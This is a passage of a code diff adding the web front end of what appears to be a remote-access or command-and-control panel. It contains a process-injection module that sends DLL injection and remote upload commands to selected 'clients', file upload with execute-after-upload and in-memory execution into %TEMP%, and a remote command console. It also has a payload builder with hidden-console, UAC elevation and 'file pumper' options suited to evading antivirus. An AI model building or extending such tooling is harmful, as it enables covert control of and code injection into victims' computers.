+                                        class="w-full bg-gray-900/50 border border-gray-700/50 text-gray-300 rounded-lg pl-10 pr-4 py-2.5 focus:ring-2 focus:ring-primary/50 focus:border-primary/50 transition-all duration-300"
+                                        readonly placeholder="No file selected">
+                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                                        <i class="fas fa-file text-gray-500"></i>
+                                    </div>
+                                </div>
+                                <p class="mt-1 text-xs text-gray-500">Supported type: .bat</p>
+                            </div>
+
+                            <div class="space-y-3">
+                                <label class="relative inline-flex items-center cursor-pointer">
+                                    <input type="checkbox" id="executeAfterUpload" class="sr-only peer" checked>
+                                    <div
+                                        class="w-11 h-6 bg-gray-700 peer-focus:outline-none peer-focus:ring-2 peer-focus:ring-primary/50 rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary">
+                                    </div>
+                                    <span class="ms-3 text-sm font-medium text-gray-300 flex items-center space-x-2">
+                                        <i class="fas fa-bolt text-gray-400"></i>
+                                        <span>Execute after upload</span>
+                                    </span>
+                                </label>
+                                <label class="relative inline-flex items-center cursor-pointer">
+                                    <input type="checkbox" id="executeInMemory2" class="sr-only peer" checked>
+                                    <div
+                                        class="w-11 h-6 bg-gray-700 peer-focus:outline-none peer-focus:ring-2 peer-focus:ring-primary/50 rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary">
+                                    </div>
+                                    <span class="ms-3 text-sm font-medium text-gray-300 flex items-center space-x-2">
+                                        <i class="fas fa-memory text-gray-400"></i>
+                                        <span>Execute in memory</span>
+                                        <span class="text-xs text-gray-500">(when possible)</span>
+                                    </span>
+                                </label>
+                            </div>
+
+                            <div class="space-y-2">
+                                <label class="flex items-center space-x-2 text-sm font-medium text-gray-300">
+                                    <i class="fas fa-folder-open text-gray-400"></i>
+                                    <span>Drop Location</span>
+                                    <span class="text-xs text-gray-500">(optional)</span>
+                                </label>
+                                <div class="relative">
+                                    <input type="text" id="dropLocationModal"
+                                        class="w-full bg-gray-900/50 border border-gray-700/50 text-gray-300 rounded-lg pl-10 pr-4 py-2.5 focus:ring-2 focus:ring-primary/50 focus:border-primary/50 transition-all duration-300"
+                                        placeholder="%TEMP%" value="%TEMP%">
+                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                                        <i class="fas fa-folder text-gray-500"></i>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div id="upload-progress" class="space-y-2 hidden">
+                                <div class="flex items-center justify-between text-sm">
+                                    <span id="upload-file-name" class="text-gray-300"></span>
+                                    <span id="upload-percent" class="text-primary">0%</span>
+                                </div>
+                                <div class="w-full bg-gray-700/50 rounded-full h-1.5 overflow-hidden">
+                                    <div id="upload-progress-bar"
+                                        class="bg-primary h-full rounded-full transition-all duration-300"
+                                        style="width: 0%"></div>
+                                </div>
+                                <div class="flex justify-end">
+                                    <span id="upload-transferred" class="text-xs text-gray-500">0 B / 0 B</span>
+                                </div>
+                            </div>
+
+                            <div class="flex space-x-3 pt-2">
+                                <button id="upload-submit"
+                                    class="flex-grow bg-primary hover:bg-primary/90 text-white rounded-lg px-4 py-2.5 flex items:center justify-center space-x-2 transition-all duration-300 shadow-lg shadow-primary/20 hover:shadow-primary/30 disabled:opacity-50 disabled:cursor-not-allowed">
+                                    <i class="fas fa-cloud-upload-alt"></i>
+                                    <span>Upload</span>
+                                </button>
+                                <button id="upload-cancel"
+                                    class="flex-grow bg-gray-700 hover:bg-gray-600 text-white rounded-lg px-4 py-2.5 flex items-center justify-center space-x-2 transition-all duration-300">
+                                    <i class="fas fa-times"></i>
+                                    <span>Cancel</span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <section id="console-section"
+                class="bg-[#252526] border border-slate-700 rounded-sm flex flex-col flex-1 h-64">
+                <div class="flex items-center justify-between px-3 py-1 border-b border-slate-700">
+                    <div class="flex items-center space-x-2">
+                        <span id="console-title" class="text-[10px] text-slate-400">Console</span>
+                        <button onclick="clearConsole()" class="text-slate-400 hover:text-blue-400 text-xs"
+                            title="Clear Console">
+                            <i class="fas fa-eraser"></i>
+                        </button>
+                    </div>
+                    <input type="text" placeholder="Search..."
+                        class="bg-[#1a1a1a] border border-slate-600 text-slate-300 text-xs px-2 py-1 rounded-sm font-mono">
+                </div>
+
+                <div id="console-output"
+                    class="flex-grow overflow-y-auto font-mono text-[10px] text-slate-300 p-2 bg-[#1a1a1a]"
+                    style="position: relative;">
+                </div>
+
+                <div class="border-t border-slate-700 p-2 flex items-center">
+                    <input id="console-command" type="text" placeholder="Enter command"
+                        class="flex-grow bg-[#1a1a1a] border border-slate-600 text-slate-300 text-xs px-2 py-1 rounded-sm font-mono mr-2">
+                    <button id="console-send" class="px-2 py-1 text-xs bg-blue-600 text-white rounded-sm">
+                        <i class="fas fa-paper-plane text-xs"></i>
+                    </button>
+                </div>
+            </section>
+        </div>
+    </div>
+
+    <script>
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', function () {
+                console.log('[DEBUG] DOM loaded, initializing Process Injection...');
+                initializeProcessInjection();
+            });
+        } else {
+            console.log('[DEBUG] DOM already loaded, initializing Process Injection...');
+            initializeProcessInjection();
+        }
+
+        function initializeProcessInjection() {
+            if (window.processInjectionInitialized) {
+                console.log('[INJECT] Process Injection already initialized, skipping...');
+                return;
+            }
+
+            console.log('[INJECT] Initializing Process Injection module...');
+            window.processInjectionInitialized = true;
+
+            const dllMethodLocal = document.getElementById('dll-method-local');
+            const dllMethodUrl = document.getElementById('dll-method-url');
+            const dllLocalInput = document.getElementById('dll-local-input');
+            const dllUrlInput = document.getElementById('dll-url-input');
+            const dllFilename = document.getElementById('dll-filename');
+            const dllUrl = document.getElementById('dll-url');
+            const injectDllBtn = document.getElementById('inject-dll-btn');
+
+            console.log('[INJECT] Elements found:', {
+                dllMethodLocal: !!dllMethodLocal,
+                dllMethodUrl: !!dllMethodUrl,
+                dllLocalInput: !!dllLocalInput,
+                dllUrlInput: !!dllUrlInput,
+                dllFilename: !!dllFilename,
+                dllUrl: !!dllUrl,
+                injectDllBtn: !!injectDllBtn
+            });
+
+            let selectedDllMethod = 'local';
+            let isInjecting = false;
+
+            if (dllMethodLocal) {
+                dllMethodLocal.addEventListener('click', function () {
+                    console.log('[INJECT] Switching to Local File method');
+                    selectedDllMethod = 'local';
+
+                    dllMethodLocal.className = 'flex-1 px-2 py-1 text-xs bg-blue-600 text-white rounded-sm';
+                    if (dllMethodUrl) {
+                        dllMethodUrl.className = 'flex-1 px-2 py-1 text-xs bg-slate-700 text-slate-400 rounded-sm';
+                    }
+
+                    if (dllLocalInput) dllLocalInput.classList.remove('hidden');
+                    if (dllUrlInput) dllUrlInput.classList.add('hidden');
+
+                    if (injectDllBtn) {
+                        injectDllBtn.innerHTML = '<i class="fas fa-syringe text-xs"></i><span class="ml-1">Inject DLL</span>';
+                    }
+
+                    validateInjectButton();
+                });
+                console.log('[INJECT] Local File button event listener added');
+            }
+
+            if (dllMethodUrl) {
+                dllMethodUrl.addEventListener('click', function () {
+                    console.log('[INJECT] Switching to URL method');
+                    selectedDllMethod = 'url';
+
+                    if (dllMethodLocal) {
+                        dllMethodLocal.className = 'flex-1 px-2 py-1 text-xs bg-slate-700 text-slate-400 rounded-sm';
+                    }
+                    dllMethodUrl.className = 'flex-1 px-2 py-1 text-xs bg-blue-600 text-white rounded-sm';
+
+                    if (dllLocalInput) dllLocalInput.classList.add('hidden');
+                    if (dllUrlInput) dllUrlInput.classList.remove('hidden');
+
+                    if (injectDllBtn) {
+                        injectDllBtn.innerHTML = '<i class="fas fa-upload text-xs"></i><span class="ml-1">Upload DLL</span>';
+                    }
+
+                    validateInjectButton();
+                });
+                console.log('[INJECT] URL button event listener added');
+            }
+
+            if (dllFilename) {
+                dllFilename.addEventListener('input', validateInjectButton);
+                console.log('[INJECT] DLL filename input event listener added');
+            }
+
+            if (dllUrl) {
+                dllUrl.addEventListener('input', validateInjectButton);
+                console.log('[INJECT] DLL URL input event listener added');
+            }
+
+            function validateInjectButton() {
+                if (!injectDllBtn) return;
+
+                let isValid = false;
+                let validationMessage = '';
+
+                const selectedProcessInfo = document.getElementById('selected-process-info');
+                const hasSelectedProcess = selectedProcessInfo && !selectedProcessInfo.classList.contains('hidden');
+
+                if (!hasSelectedProcess) {
+                    validationMessage = 'Please select a process first';
+                } else {
+                    if (selectedDllMethod === 'local') {
+                        const filename = dllFilename ? dllFilename.value.trim() : '';
+                        if (filename && filename.endsWith('.dll')) {
+                            isValid = true;
+                        } else if (filename) {
+                            validationMessage = 'Please enter a valid DLL filename (must end with .dll)';
+                        } else {
+                            validationMessage = 'Please enter a DLL filename';
+                        }
+                    } else if (selectedDllMethod === 'url') {
+                        const url = dllUrl ? dllUrl.value.trim() : '';
+                        if (url && url.includes('://') && url.endsWith('.dll')) {
+                            isValid = true;
+                        } else if (url && url.includes('://')) {
+                            validationMessage = 'URL should point to a .dll file';
+                        } else if (url) {
+                            validationMessage = 'Please enter a valid URL (must start with http:// or https://)';
+                        } else {
+                            validationMessage = 'Please enter a valid URL';
+                        }
+                    }
+                }
+
+                if (isValid) {
+                    injectDllBtn.disabled = false;
+                    if (selectedDllMethod === 'local') {
+                        injectDllBtn.title = 'Click to inject DLL';
+                        console.log('[INJECT] Inject button enabled - ready to inject');
+                    } else {
+                        injectDllBtn.title = 'Click to upload DLL';
+                        console.log('[INJECT] Upload button enabled - ready to upload');
+                    }
+                } else {
+                    injectDllBtn.disabled = true;
+                    injectDllBtn.title = validationMessage;
+                    if (selectedDllMethod === 'local') {
+                        console.log('[INJECT] Inject button disabled:', validationMessage);
+                    } else {
+                        console.log('[INJECT] Upload button disabled:', validationMessage);
+                    }
+                }
+            }
+
+            window.validateInjectButton = validateInjectButton;
+
+            if (injectDllBtn && !injectDllBtn.hasListener) {
+                injectDllBtn.hasListener = true;
+
+                injectDllBtn.addEventListener('click', async function (event) {
+
+                    event.preventDefault();
+                    event.stopPropagation();
+
+                    const clickId = Date.now() + '-' + Math.random();
+                    console.log('[INJECT] Inject DLL button clicked! Click ID:', clickId);
+
+                    if (isInjecting) {
+                        console.log('[INJECT] Already injecting, ignoring duplicate click. Click ID:', clickId);
+                        return;
+                    }
+
+                    console.log('[INJECT] Setting isInjecting flag to true. Click ID:', clickId);
+                    isInjecting = true;
+
+                    const selectedProcessDetails = document.getElementById('selected-process-details');
+                    if (!selectedProcessDetails) {
+                        console.log('[INJECT] No process selected, aborting. Click ID:', clickId);
+                        isInjecting = false;
+                        alert('No process selected!');
+                        return;
+                    }
+
+                    const processText = selectedProcessDetails.textContent;
+                    const pidMatch = processText.match(/PID:\s*(\d+)/);
+                    const processMatch = processText.match(/Process:\s*([^\n]+)/);
+
+                    if (!pidMatch) {
+                        console.log('[INJECT] Could not extract process PID, aborting. Click ID:', clickId);
+                        isInjecting = false;
+                        alert('Could not extract process PID!');
+                        return;
+                    }
+
+                    const pid = pidMatch[1];
+                    const processName = processMatch ? processMatch[1] : 'Unknown';
+
+                    let dllInfo = '';
+                    let commandPreview = '';
+                    if (selectedDllMethod === 'local') {
+                        dllInfo = dllFilename ? dllFilename.value.trim() : '';
+                        commandPreview = `dllinject ${processName} ${dllInfo}`;
+                    } else {
+                        dllInfo = dllUrl ? dllUrl.value.trim() : '';
+                        commandPreview = `upload ${dllInfo}`;
+                    }
+
+                    const targetInfo = document.getElementById('injection-target-info');
+                    let targetClient = '';
+                    if (targetInfo && targetInfo.textContent.includes('Client:')) {
+                        const match = targetInfo.textContent.match(/Client:\s*([^\s]+)/);
+                        if (match) {
+                            targetClient = match[1];
+                        }
+                    }
+
+                    if (!targetClient) {
+                        console.log('[INJECT] No target client detected, aborting. Click ID:', clickId);
+                        isInjecting = false;
+                        alert('No target client detected! Please detect a client first.');
+                        return;
+                    }
+
+                    injectDllBtn.disabled = true;
+                    if (selectedDllMethod === 'local') {
+                        injectDllBtn.innerHTML = '<i class="fas fa-spinner fa-spin text-xs"></i><span class="ml-1">Injecting...</span>';
+                    } else {
+                        injectDllBtn.innerHTML = '<i class="fas fa-spinner fa-spin text-xs"></i><span class="ml-1">Uploading...</span>';
+                    }
+
+                    try {
+                        let injectionCommand = '';
+                        if (selectedDllMethod === 'local') {
+                            injectionCommand = `dllinject ${processName} ${dllInfo}`;
+                        } else {
+                            injectionCommand = `upload ${dllInfo}`;
+                        }
+
+                        console.log('[INJECT] Sending injection command:', injectionCommand, 'Click ID:', clickId);
+
+                        let commandSent = false;
+
+                        if (window.sendCommandToClient && typeof window.sendCommandToClient === 'function') {
+                            console.log('[INJECT] Using global sendCommandToClient function. Click ID:', clickId);
+                            commandSent = true;
+                            const result = await window.sendCommandToClient(targetClient, injectionCommand, true);
+                            if (result && result.success) {
+                                const successText = selectedDllMethod === 'local' ? 'DLL injection completed successfully!' : 'DLL upload completed successfully!';
+                                //alert(`${successText}\n\nTarget: ${targetClient}\nProcess: ${processName} (PID: ${pid})\nDLL: ${dllInfo}`);
+                            } else {
+                                throw new Error('Command failed: ' + (result ? result.error : 'Unknown error'));
+                            }
+                        } else {
+                            console.log('[INJECT] Using fallback direct command send. Click ID:', clickId);
+                            commandSent = true;
+                            const headers = {
+                                'Content-Type': 'application/json'
+                            };
+
+                            if (window.Auth) {
+                                const token = window.Auth.getToken();
+                                const csrf = window.Auth.getCSRFToken();
+                                if (token && csrf) {
+                                    headers['Authorization'] = `Bearer ${token}`;
+                                    headers['X-CSRF-Token'] = csrf;
+                                }
+                            }
+
+                            const response = await fetch('/command', {
+                                method: 'POST',
+                                headers: headers,
+                                body: JSON.stringify({
+                                    id: targetClient,
+                                    command: injectionCommand
+                                }),
+                                credentials: 'include'
+                            });
+
+                            if (!response.ok) {
+                                throw new Error(`HTTP error! status: ${response.status}`);
+                            }
+
+                            const data = await response.json();
+                            console.log('[INJECT] Command response:', data);
+
+                            if (data.status === "Command sent") {
+                                const successText = selectedDllMethod === 'local' ? 'DLL injection completed successfully!' : 'DLL upload completed successfully!';
+                                //alert(`${successText}\n\nTarget: ${targetClient}\nProcess: ${processName} (PID: ${pid})\nDLL: ${dllInfo}`);
+                            } else {
+                                throw new Error('Command not sent: ' + (data.error || 'Unknown error'));
+                            }
+                        }
+
+                        if (!commandSent) {
+                            console.error('[INJECT] No command was sent! This should not happen. Click ID:', clickId);
+                            throw new Error('No command sending method available');
+                        }
+
+                        console.log('[INJECT] Command sent successfully. Click ID:', clickId);
+
+                    } catch (error) {
+                        const errorType = selectedDllMethod === 'local' ? 'Injection' : 'Upload';
+                        console.error(`[INJECT] ${errorType} failed:`, error, 'Click ID:', clickId);
+                        alert(`${errorType} failed: ` + error.message);
+                    } finally {
+                        console.log('[INJECT] Resetting injection state. Click ID:', clickId);
+                        if (selectedDllMethod === 'local') {
+                            injectDllBtn.innerHTML = '<i class="fas fa-syringe text-xs"></i><span class="ml-1">Inject DLL</span>';
+                        } else {
+                            injectDllBtn.innerHTML = '<i class="fas fa-upload text-xs"></i><span class="ml-1">Upload DLL</span>';
+                        }
+                        isInjecting = false;
+                        validateInjectButton();
+
+                        setTimeout(() => {
+                            console.log('[INJECT] Safety timeout reset. Click ID:', clickId);
+                            isInjecting = false;
+                        }, 1000);
+                    }
+                });
+                console.log('[INJECT] Inject DLL button event listener added');
+            }
+
+            validateInjectButton();
+
+            console.log('[INJECT] Process Injection initialization complete');
+        }
+
+        function initializeProcessSearch() {
+            const searchInput = document.getElementById('process-search');
+            const processContainer = document.getElementById('process-list-container');
+
+            if (!searchInput || !processContainer) {
+                console.log('[SEARCH] Process search elements not found, skipping initialization');
+                return;
+            }
+
+            console.log('[SEARCH] Initializing process search functionality...');
+
+            function filterProcesses(searchTerm) {
+                const processItems = processContainer.querySelectorAll('.process-item');
+                let visibleCount = 0;
+
+                searchTerm = searchTerm.toLowerCase().trim();
+
+                processItems.forEach(item => {
+                    const processName = item.getAttribute('data-name') || '';
+                    const processPid = item.getAttribute('data-pid') || '';
+
+                    const matchesName = processName.toLowerCase().includes(searchTerm);
+                    const matchesPid = processPid.includes(searchTerm);
+
+                    if (searchTerm === '' || matchesName || matchesPid) {
+                        item.style.display = 'block';
+                        visibleCount++;
+                    } else {
+                        item.style.display = 'none';
+                    }
+                });
+
+                processContainer.setAttribute('data-visible-count', visibleCount.toString());
+
+                const existingNoResults = processContainer.querySelector('.no-search-results');
+                if (existingNoResults) {
+                    existingNoResults.remove();
+                }
+
+                if (visibleCount === 0 && searchTerm !== '' && processItems.length > 0) {
+                    const noResultsDiv = document.createElement('div');
+                    noResultsDiv.className = 'no-search-results text-xs text-slate-500 text-center py-4';
+                    noResultsDiv.textContent = `No processes found matching "${searchTerm}"`;
+                    processContainer.appendChild(noResultsDiv);
+                }
+
+                console.log(`[SEARCH] Filtered processes: ${visibleCount}/${processItems.length} visible for term: "${searchTerm}"`);
+            }
+
+            let searchTimeout;
+            searchInput.addEventListener('input', function (event) {
+                const searchTerm = event.target.value;
+
+                if (searchTimeout) {
+                    clearTimeout(searchTimeout);
+                }
+
+                searchTimeout = setTimeout(() => {
+                    filterProcesses(searchTerm);
+                }, 150);
+            });
+
+            searchInput.addEventListener('keydown', function (event) {
+                if (event.key === 'Escape') {
+                    searchInput.value = '';
+                    filterProcesses('');
+                    searchInput.blur();
+                }
+            });
+
+            console.log('[SEARCH] Process search functionality initialized');
+        }
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initializeProcessSearch);
+        } else {
+            initializeProcessSearch();
+        }
+
+        const fileBtn = document.getElementById('file-exec-btn');
+        const fileSec = document.getElementById('fileexec-section');
+        const closeFile = document.getElementById('close-fileexec-btn');
+
+        const eventLogsBtn = document.getElementById('event-logs-btn');
+        const eventLogsSec = document.getElementById('eventlogs-section');
+        const closeEventLogs = document.getElementById('close-eventlogs-btn');
+        const clearEventLogs = document.getElementById('clear-eventlogs-btn');
+        const eventLogsOutput = document.getElementById('event-logs-output');
+
+        const processInjectionBtn = document.getElementById('process-injection-btn');
+        const processInjectionSec = document.getElementById('process-injection-section');
+        const closeProcessInjection = document.getElementById('close-process-injection-btn');
+
+        fileBtn.addEventListener('click', () => fileSec.classList.toggle('hidden'));
+        closeFile.addEventListener('click', () => fileSec.classList.add('hidden'));
+
+        if (processInjectionBtn && processInjectionSec) {
+            processInjectionBtn.addEventListener('click', () => {
+                processInjectionSec.classList.toggle('hidden');
+            });
+        }
+        if (closeProcessInjection) {
+            closeProcessInjection.addEventListener('click', () => {
+                processInjectionSec.classList.add('hidden');
+            });
+        }
+
+        const uploadModal = document.getElementById('uploadModal');
+        const fileUploadClose = document.getElementById('file-upload-close');
+        const dropZoneModal = document.querySelector('#uploadModal #drop-zone');
+        const fileUploadInput = document.getElementById('file-upload-input');
+        const selectedFileDisplay = document.getElementById('selected-file-display');
+
+        const aboutModal = document.getElementById('aboutModal');
+        const payloadBuilderModal = document.getElementById('payload-builder-modal');
+        const aboutClose = document.getElementById('about-close');
+        const closePayloadBuilderModal = document.getElementById('close-payload-builder-modal');
+        const payloadBuilderBtn = document.getElementById('payload-builder-btn');
+        const aboutBtn = document.getElementById('about-btn');
+
+        const filePumperCheckbox = document.getElementById('payload-file-pumper');
+        const pumperOptions = document.getElementById('pumper-options');
+
+        const buildPayloadBtn = document.getElementById('build-payload-btn');
+        const buildOutput = document.getElementById('build-output');
+        const downloadSection = document.getElementById('download-section');
+
+        if (aboutBtn) {
+            aboutBtn.addEventListener('click', () => {
+                aboutModal.classList.remove('hidden');
+            });
+        }
+
+        if (payloadBuilderBtn) {
+            payloadBuilderBtn.addEventListener('click', () => {
+                payloadBuilderModal.classList.remove('hidden');
+            });
+        }
+
+        aboutClose.addEventListener('click', () => {
+            aboutModal.classList.add('hidden');
+        });
+
+        closePayloadBuilderModal.addEventListener('click', () => {
+            payloadBuilderModal.classList.add('hidden');
+        });
+
+        aboutModal.addEventListener('click', (e) => {
+            if (e.target === aboutModal) {
+                aboutModal.classList.add('hidden');
+            }
+        });
+
+        payloadBuilderModal.addEventListener('click', (e) => {
+            if (e.target === payloadBuilderModal) {
+                payloadBuilderModal.classList.add('hidden');
+            }
+        });
+
+        filePumperCheckbox.addEventListener('change', () => {
+            if (filePumperCheckbox.checked) {
+                pumperOptions.classList.remove('hidden');
+            } else {
+                pumperOptions.classList.add('hidden');
+            }
+        });
+
+        const formatRadios = document.querySelectorAll('input[name="payload-format"]');
+        const exeOnlyOptions = ['payload-debug-option', 'payload-console-option', 'payload-uac-option'];
+
+        formatRadios.forEach(radio => {
+            radio.addEventListener('change', () => {
+                const selectedFormat = document.querySelector('input[name="payload-format"]:checked').value;
+
+                if (selectedFormat === 'dll') {
+                    exeOnlyOptions.forEach(optionId => {
+                        const option = document.getElementById(optionId);
+                        if (option) {
+                            option.style.display = 'none';
+                        }
+                    });
+                } else {
+                    exeOnlyOptions.forEach(optionId => {
+                        const option = document.getElementById(optionId);
+                        if (option) {
+                            option.style.display = 'flex';
+                        }
+                    });
+                }
+            });
+        });
+
+        buildPayloadBtn.addEventListener('click', async () => {
+            if (!window.Auth) {
+                console.error('[DEBUG] Auth module not available');
+                return;
+            }
+
+            const csrf = window.Auth.getCSRFToken();
+            if (!csrf) {
+                console.error('[DEBUG] No CSRF token available for build request');
+                return;
+            }
+
+            const serverUrl = document.getElementById('payload-server-url').value;
+            const outputName = document.getElementById('payload-output-name').value;
+            const outputFormat = document.querySelector('input[name="payload-format"]:checked').value;
+            const debugMode = document.getElementById('payload-debug-mode').checked;
+            const hideConsole = document.getElementById('payload-hide-console').checked;
+            const requestUac = document.getElementById('payload-request-uac').checked;
+            const stripDebug = document.getElementById('payload-strip-debug').checked;
+            const filePumper = document.getElementById('payload-file-pumper').checked;
+            const pumperSize = parseFloat(document.getElementById('pumper-size').value) || 0;
+            const pumperUnit = document.getElementById('pumper-unit').value;
+
+            if (!serverUrl) {
+                appendBuildOutput('ERROR: Server URL is required', 'text-red-400');
+                return;
+            }
+
+            if (filePumper && pumperSize <= 0) {
+                appendBuildOutput('ERROR: Please enter a valid pump size', 'text-red-400');
+                return;
+            }
+
+            const buildOptions = {
+                serverUrl: serverUrl,
+                outputName: outputName || 'client',
+                outputFormat: outputFormat,
+                debugMode: debugMode,
+                hideConsole: hideConsole,
+                uacMode: requestUac,
+                stripDebug: stripDebug,
+                pumpEnabled: filePumper,
+                pumpSize: pumperSize,
+                pumpUnit: pumperUnit
+            };
+
+            buildOutput.innerHTML = '';
+
+            buildPayloadBtn.disabled = true;
+            buildPayloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span class="ml-2">Building...</span>';
+
+            appendBuildOutput('Starting build process...', 'text-blue-400');
+            appendBuildOutput(`Server URL: ${serverUrl}`, 'text-slate-300');
+            appendBuildOutput(`Output Name: ${buildOptions.outputName}`, 'text-slate-300');
+            appendBuildOutput(`Output Format: ${outputFormat.toUpperCase()}`, 'text-slate-300');
+            appendBuildOutput(`Debug Mode: ${debugMode}`, 'text-slate-300');
+            appendBuildOutput(`Hide Console: ${hideConsole}`, 'text-slate-300');
+            appendBuildOutput(`UAC Mode: ${requestUac}`, 'text-slate-300');
+            appendBuildOutput(`Strip Debug Info: ${stripDebug}`, 'text-slate-300');
+
+            if (filePumper) {
+                appendBuildOutput(`File Pumper: Enabled (${pumperSize} ${pumperUnit})`, 'text-slate-300');
+            }
+
+            try {
+                const response = await fetch('/build', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-Token': csrf
+                    },
+                    body: JSON.stringify(buildOptions),
+                    credentials: 'include'
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+
+                const data = await response.json();
+
+                if (data.error) {
+                    throw new Error(data.error);
+                }
+
+                appendBuildOutput('Build completed successfully!', 'text-green-400');
+                appendBuildOutput(`Output path: ${data.outputPath}`, 'text-green-400');
+                appendBuildOutput(`Build time: ${data.buildTime}ms`, 'text-slate-300');
+
+                const filename = data.outputPath.split('\\').pop();
+                document.getElementById('download-filename').textContent = filename;
+                document.getElementById('download-size').textContent = data.size || '2.1 MB';
+                downloadSection.classList.remove('hidden');
+
+            } catch (error) {
+                console.error('Error building client:', error);
+                appendBuildOutput(`Build failed: ${error.message}`, 'text-red-400');
+            } finally {
+                buildPayloadBtn.disabled = false;
+                buildPayloadBtn.innerHTML = '<i class="fas fa-cogs"></i><span class="ml-2">Build Payload</span>';
+            }
+        });
+
+        function appendBuildOutput(message, className = 'text-slate-300') {
+            const outputDiv = buildOutput;
+            const newLine = document.createElement('div');
+            newLine.className = `text-xs font-mono ${className}`;
+
+            if (message.startsWith('✓')) {
+                newLine.innerHTML = `<span class="text-green-400">${message}</span>`;
+            } else if (message.startsWith('>')) {
+                newLine.innerHTML = `<span class="text-blue-400">${message}</span>`;
+            } else {
+                newLine.textContent = message;
+            }
+
+            outputDiv.appendChild(newLine);
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        let eventLogsPollingInterval = null;
+        let lastLogTimestamp = 0;
+
+        function startEventLogsStreaming() {
+            if (eventLogsPollingInterval) return;
+
+            console.log('[DEBUG] Starting event logs polling...');
+
+            try {
+                const token = window.Auth ? window.Auth.getToken() : null;
+                const csrf = window.Auth ? window.Auth.getCSRFToken() : null;
+
+                console.log('[DEBUG] Auth tokens:', { hasToken: !!token, hasCsrf: !!csrf });
+
+                if (!token || !csrf) {
+                    console.error('No authentication tokens available for event logs');
+                    appendEventLog({
+                        timestamp: new Date().toISOString(),
+                        level: 'ERROR',
+                        message: '[STREAM] Authentication required'
+                    });
+                    return;
+                }
+
+                console.log('[DEBUG] Starting polling for server logs');
+
+                appendEventLog({
+                    timestamp: new Date().toISOString(),
+                    level: 'INFO',
+                    message: '[STREAM] Event logs connected'
+                });
+
+                fetchServerLogs(token, csrf);
+
+                eventLogsPollingInterval = setInterval(() => {
+                    fetchServerLogs(token, csrf);
+                }, 2000);
+
+            } catch (error) {
+                console.error('Failed to start event logs streaming:', error);
+                appendEventLog({
+                    timestamp: new Date().toISOString(),
+                    level: 'ERROR',
+                    message: `[STREAM] Failed to start: ${error.message}`
+                });
+            }
+        }
+
+        function fetchServerLogs(token, csrf) {
+            fetch('/api/server-logs', {
+                method: 'GET',
+                headers: {
+                    'Authorization': `Bearer ${token}`,
+                    'X-CSRF-Token': csrf,
+                    'Content-Type': 'application/json'
+                },
+                credentials: 'include'
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.logs && Array.isArray(data.logs)) {
+                        data.logs.forEach(logEntry => {
+                            const logTimestamp = new Date(logEntry.timestamp).getTime();
+                            if (logTimestamp > lastLogTimestamp) {
+                                appendEventLog(logEntry);
+                                lastLogTimestamp = logTimestamp;
+                            }
+                        });
+                    }
+                })
+                .catch(error => {
+                    console.error('Failed to fetch server logs:', error);
+                    appendEventLog({
+                        timestamp: new Date().toISOString(),
+                        level: 'ERROR',
+                        message: `[STREAM] Fetch error: ${error.message}`
+                    });
+                });
+        }
+
+        function stopEventLogsStreaming() {
+            if (eventLogsPollingInterval) {
+                clearInterval(eventLogsPollingInterval);
+                eventLogsPollingInterval = null;
+                console.log('Event logs polling stopped');
+            }
+        }
+
+        function appendEventLog(logEntry) {
+            const logDiv = document.createElement('div');
+            logDiv.className = 'text-[9px] font-mono break-all';
+
+            let logText = '';
+            let logLevel = 'INFO';
+            let timestamp = '';
+
+            if (typeof logEntry === 'object' && logEntry.message) {
+                logText = logEntry.message;
+                logLevel = logEntry.level || 'INFO';
+                timestamp = new Date(logEntry.timestamp).toLocaleTimeString();
+            } else {
+                logText = logEntry.toString();
+                const levelMatch = logText.match(/\[(FATAL|ERROR|WARNING|INFO|PANIC|GET|POST|PUT|DELETE|STATIC|ROUTES)\]/);
+                if (levelMatch) {
+                    logLevel = levelMatch[1];
+                }
+                timestamp = new Date().toLocaleTimeString();
+            }
+
+            let levelColor = '';
+            switch (logLevel) {
+                case 'FATAL':
+                case 'ERROR':
+                    levelColor = 'text-red-400';
+                    break;
+                case 'WARNING':
+                    levelColor = 'text-yellow-400';
+                    break;
+                case 'INFO':
+                    levelColor = 'text-blue-400';
+                    break;
+                case 'PANIC':
+                    levelColor = 'text-red-600';
+                    break;
+                case 'GET':
+                    levelColor = 'text-green-400';
+                    break;
+                case 'POST':
+                    levelColor = 'text-orange-400';
+                    break;
+                case 'PUT':
+                    levelColor = 'text-purple-400';
+                    break;
+                case 'DELETE':
+                    levelColor = 'text-red-400';
+                    break;
+                case 'STATIC':
+                    levelColor = 'text-gray-400';
+                    break;
+                case 'ROUTES':
+                    levelColor = 'text-cyan-400';
+                    break;
+                default:
+                    levelColor = 'text-slate-300';
+            }
+
+            const fullText = `${timestamp} ${logText}`;
+            logDiv.innerHTML = `<span class="text-slate-500">${timestamp}</span> <span class="${levelColor}">${logText}</span>`;
+            logDiv.setAttribute('data-original-text', logDiv.innerHTML);
+            logDiv.setAttribute('data-search-text', fullText.toLowerCase());
+
+            const currentFontSize = (eventLogsZoomLevel / 100) * 10;
+            logDiv.style.setProperty('font-size', currentFontSize + 'px', 'important');
